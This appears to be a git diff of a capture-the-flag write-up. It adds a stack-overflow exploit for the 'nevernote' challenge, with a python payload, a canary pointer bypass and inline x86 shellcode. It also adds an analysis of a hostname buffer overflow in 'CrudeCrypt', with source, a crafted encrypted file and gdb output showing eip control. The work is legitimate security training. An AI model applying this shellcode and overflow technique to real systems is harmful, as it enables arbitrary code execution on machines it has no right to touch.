@@ -178,7 +178,7 @@ Breakpoint 3, 0x08048b50 in command_loop ()
 0x804c008:      0x6d6f682f
 {% endhighlight %}
 
-Try again the new solution. Note that I've added some junk after the canary pointer in order not to break the inner stack frame. The full call path was following: command_loop() -> add_note() -> get_note() -> verify_canary(). When *get_note()* was called, the buffer overflow happened, then it called verify_canary() to check the buffer overflow. If not enough care was taken, the buffer overflow would break the stack frame for *verify_canary()*.
+Try again the new solution. Note that I've added some junk after the canary pointer in order not to break the inner stack frame. The full call path was following: command_loop() -> add_note() -> get_note() -> verify_canary(). When *get_note()* was called, the buffer overflow happened, then it called verify_canary() to check the buffer overflow. If not enough care was taken, the buffer overflow would break the stack frame of *verify_canary()*.
 
 {% highlight asm %}
 (gdb) r <<< $(python -c 'print "someone\n" + "add\n" + "a"*578 +"\x2f\x68\x6f\x6d" + "\x08\xc0\x04\x08" +"aaaa"+ "bbbb" + "\x58\xd6\xff\xff"*2 + "cccc" + "\xc0\x8a\xfc\xf7"*10')
@@ -187,14 +187,163 @@ Please enter your name: Enter a command: Write your note:
 ived signal SIGSEGV, Segmentation fault.
 0x63636363 in ?? ()
 => 0x63636363:  Cannot access memory at address 0x63636363
-:     Cannot access memory at address 0x61616161
 {% endhighlight %}
 
-So now I could control the *eip*. There was no ASLR and NX protection, I could put my shellcode on the stack and set *eip* to it.
+So now I could control the *eip*. There was no ASLR and NX protection, I could put my shellcode on the stack (replace "a"\*578 by the shellcode) and set *eip* to it (replace cccc by the address of stack). I used a custom shellcode that did execve("/tmp/aaa", ["/tmp/aaa", NULL], NULL). Inside */tmp/aaa*, I've just done a *cat* on the flag file. To find out how to write a tiny shellcode, check this [repository](https://github.com/cregnec/tiny-shellcode).
+
+{% highlight bash %}
+pico57275@shell:/home/nevernote$ /tmp/aaa
+#! /bin/sh
+cat /home/nevernote/flag.txt
+
+pico57275@shell:~$ /home/nevernote/nevernote <<< $(python -c 'print "someone\n" + "add\n" + "a"*52 + "\x90"*498 + "\x6a\x0b\x58\x99\x52\x68\x2f\x61\x61\x61\x68\x2f\x74\x6d\x70\x89\xe3\x52\x53\x89\xe1\xcd\x80\x6a\x01\x58\xcd\x80"  +"\x2f\x68\x6f\x6d" + "\x08\xc0\x04\x08" +"aaaa"+ "bbbb" + "\x58\xd6\xff\xff"*2 + "\xd0\xd4\xff\xff" + "\xc0\x8a\xfc\xf7"*10')
+Please enter your name: Enter a command: Write your note: the_hairy_canary_fairy_is_still_very_wary
+{% endhighlight %}
 
 CrudeCrypt
 ==========
 *Without proper maintainers, development of Truecrypt has stopped! CrudeCrypt has emerged as a notable alternative in the open source community. The author has promised it is 'secure' but we know better than that. Take a look at the code and read the contents of flag.txt*
+
+Let's how crude would this program be! The following code was a part of the *main* function. There were two options: *encrypt* and *decrypt*. Note that while encrypting, the effective group id was removed (line 12). This means that we could not encrypt a file that we did not have the access right. In the other hand, while decrypting, the effective group id was not removed. Then it asked a password (line 22) and the hash of this password would be used as encryption (or decryption) key (line 25 to 28). Next, let's check its encryption routine.
+
+{% highlight c linenos %}
+int main(int argc, char **argv) {
+    if(argc < 4) {
+        help();
+        return -1;
+    }
+
+    void (*action)(FILE*, FILE*, unsigned char*);
+
+    if(strcmp(argv[1], "encrypt") == 0) {
+        action = &encrypt_file;
+        // You shouldn't be able to encrypt files you don't have permission to.
+        setegid(getgid());
+    } else if(strcmp(argv[1], "decrypt") == 0) {
+        action = &decrypt_file;
+    } else {
+        printf("%s is not a valid action.\n", argv[1]);
+        help();
+        return -2;
+    }
+    ...
+    printf("-> File password: ");
+    fgets(file_password, PASSWORD_LEN, stdin);
+    printf("\n");
+
+    unsigned char digest[16];
+    hash_password(digest, file_password);
+
+    action(src_file, out_file, digest);
+    ...
+}
+{% endhighlight %}
+
+The encryption route prepended a *file_header* struct to the original file (line 21, 22) and then encrypted them with the hash of the given password (line 24). *file_header* had three field: *magic*, *file_size* and *host* (line 5 to 9). *magic* had a fixed value and was used after decryption to verify if the password was correct. *host* stored the machine's hostname that was used for encryption (line 19). This field had a fixed size of 32 (line 1). Until now, nothing special to say, I continued to look at the decryption routine.
+
+{% highlight c linenos %}
+#define HOST_LEN 32
+#define MULT_BLOCK_SIZE(size)                                   \
+    (!((size) % 16) ? (size) : (size) + (16 - ((size) % 16)))
+
+typedef struct {
+    unsigned int magic_number;
+    unsigned long file_size;
+    char host[HOST_LEN];
+} file_header;
+
+
+void encrypt_file(FILE* raw_file, FILE* enc_file, unsigned char* key) {
+    int size = file_size(raw_file);
+    size_t block_size = MULT_BLOCK_SIZE(sizeof(file_header) + size);
+    char* padded_block = calloc(1, block_size);
+
+    file_header header;
+    init_file_header(&header, size);
+    safe_gethostname(header.host, HOST_LEN);
+
+    memcpy(padded_block, &header, sizeof(file_header));
+    fread(padded_block + sizeof(file_header), 1, size, raw_file);
+
+    if(encrypt_buffer(padded_block, block_size, (char*)key, 16) != 0) {
+        printf("There was an error encrypting the file!\n");
+        return;
+    }
+    ...
+}
+{% endhighlight %}
+
+The decryption routine first check if the password was correct (line 13 to 17). Then it called *check_hostname(header)* to check the hostname (line 19 to 21). In this function, it copied the decrypted hostname to a local variable *saved_host* (line 27). Here it supposed that the decrypted hostname's size would not be bigger than *HOST_LEN* that was 32. There was no check on the size of the decrypted hostname. Therefore, if we crafted a encrypted file with a hostname whose size was much bigger than 32, we could generate a buffer overflow!
+
+{% highlight c linenos %}
+void decrypt_file(FILE* enc_file, FILE* raw_file, unsigned char* key) {
+    int size = file_size(enc_file);
+    char* enc_buf = calloc(1, size);
+    fread(enc_buf, 1, size, enc_file);
+
+    if(decrypt_buffer(enc_buf, size, (char*)key, 16) != 0) {
+        printf("There was an error decrypting the file!\n");
+        return;
+    }
+
+    char* raw_buf = enc_buf;
+    file_header* header = (file_header*) raw_buf;
+
+    if(header->magic_number != MAGIC) {
+        printf("Invalid password!\n");
+        return;
+    }
+
+    if(!check_hostname(header)) {
+        printf("[#] Warning: File not encrypted by current machine.\n");
+    }
+    ...
+}
+
+bool check_hostname(file_header* header) {
+    char saved_host[HOST_LEN], current_host[HOST_LEN];
+    strncpy(saved_host, header->host, strlen(header->host));
+    safe_gethostname(current_host, HOST_LEN);
+    return strcmp(saved_host, current_host) == 0;
+}
+{% endhighlight %}
+
+In order to do this, I copied the c source and Makefile to the */tmp/* directory. I chagned the *safe_gethostname* function so that I could have a evil hostname. I've set the hostname's lenght to 128.
+
+{% highlight c linenos %}
+$cat crude_crypt.c
+...
+#define HOST_LEN 128
+...
+
+void safe_gethostname(char *name, size_t len) {
+    /*gethostname(name, len);*/
+    int i = 0;
+    for (i=0; i<len; i++){
+        name[i] = 0x66;
+    }
+    name[len-1] = '\0';
+}
+...
+
+$make
+$./crude_crypt encrypt Makefile evil
+-=- Welcome to CrudeCrypt 0.1 Beta -=-
+-> File password: a
+
+=> Encrypted file successfully
+$gdb -q --args /home/crudecrypt/crude_crypt decrypt evil output
+(gdb) r
+Starting program: /home/crudecrypt/crude_crypt decrypt evil output
+-=- Welcome to CrudeCrypt 0.1 Beta -=-
+-> File password: a
+
+Program received signal SIGSEGV, Segmentation fault.
+0x66666666 in ?? ()
+(gdb) q
+{% endhighlight %}
+
+Well, the *eip* was overwritten to 0x66666666 that we controlled. There was neither ASLR nor NX protection. Therefore, we can use the same technique as the previous challenge *nevernote*. I will omit the following steps :p. The lesson learned: never trust user inputs !
 
 Fancy Cache
 ============
